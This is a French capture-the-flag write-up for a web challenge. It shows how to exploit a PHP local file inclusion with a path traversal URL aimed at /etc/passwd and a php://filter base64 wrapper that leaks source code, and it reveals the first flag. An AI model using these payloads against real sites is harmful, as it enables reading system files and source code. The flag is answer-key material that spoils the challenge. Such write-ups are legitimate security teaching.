# Web : Passage piéton
**Challenge Author(s)**: SevenInside
**Difficulty**: Moyen

## Synopsis

Ce site de fan de passages piétons semble cacher ses secrets.

## Steps to solve

Le site expose ses pages au travers d'un paramètre GET ( par exemple`?page=galerie`). On remarque en changeant le paramètre qu'il s'agit d'une inclusion PHP, qui est vulnerable à une LFI
l'URL suivante `/index.php?page=../../../../etc/passwd`. On voit l'erreur suivante :

```bash
Warning: include(../../../../etc/passwd.php): Failed to open stream: No such file or directory in
/var/www/html/index.php on line 84
Warning: include(): Failed opening '../../../../etc/passwd.php' for inclusion (include_path='.:/usr/local/lib/php') in
/var/www/html/index.php on line 84
```

On est sur une inclusion de fichier locale (LFI) typique d’un CTF, avec un `include($page.'.php')`, donc la chaîne .php est
toujours suffixée. On peut cependant lire `index.php` avec un wrapper PHP comme: `/index.php?page=php://filter/convert.base64-encode/resource=index`, puis en décodant avec un `base64 -d`.

La page qui semble nous intéresser est `galerie.php`. En effet, cette page semble contenir une liste d'entrées qui pourraient être configurées par une base de données. On va donc à l'adresse `/index.php?page=php://filter/convert.base64-encode/resource=galerie`.

![Galerie-base64](passage-1.png)

Une fois décodé, on obtient le code suivant :

```php
<?php
// hit{PremierPassageTraversé!}
$db = new SQLite3('bdd-passages/troadeg-bZh.sqlite');
$images = [];
$results = $db->query('SELECT filename, description FROM passages');
while ($row = $results->fetchArray()) {
$images[$row['filename']] = $row['description'];
}
echo "<h3>Galerie - Les plus beaux passages piétons</h3>";
echo "<div class='gallery'>";
foreach ($images as $image => $description) {
echo "<div class='gallery-item'>";
echo "<img src='images/$image' alt='$description' style='max-width:90%; display:block; margin:0 auto;'>";
echo "<p>$description</p>";
echo "</div>";
}
echo "</div>";
?>
```
 
On obtient ainsi le premier flag : `hit{PremierPassageTraversé!}`